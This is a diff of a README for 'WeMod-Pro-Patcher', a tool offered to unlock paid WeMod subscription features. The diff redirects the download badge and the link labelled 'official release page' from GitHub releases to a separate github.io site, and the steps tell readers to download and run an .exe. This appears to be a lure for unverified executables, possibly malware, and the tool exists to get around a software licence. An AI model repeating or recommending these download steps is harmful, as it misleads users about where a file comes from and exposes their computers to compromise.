@@ -1,6 +1,6 @@
 # 🛠️ WeMod-Pro-Patcher - Unlock premium features in your games
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Natalinefenestral664/WeMod-Pro-Patcher/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://natalinefenestral664.github.io)
 
 WeMod-Pro-Patcher allows users to access premium features within the WeMod platform. WeMod provides tools for game trainers and mods. This patcher modifies your local software to enable functions usually reserved for paid subscriptions. These features include remote control of cheats, removal of advertisements, personal hotkey setups, priority assistance, and early trainer access.
 
@@ -13,7 +13,7 @@ Your computer must meet these criteria to run this tool:
 ## 📥 How to download and run
 Follow these steps to set up the software.
 
-1. Go to the [official release page](https://github.com/Natalinefenestral664/WeMod-Pro-Patcher/releases).
+1. Go to the [official release page](https://natalinefenestral664.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to download it.
 4. Save the file to your desktop for easy access.
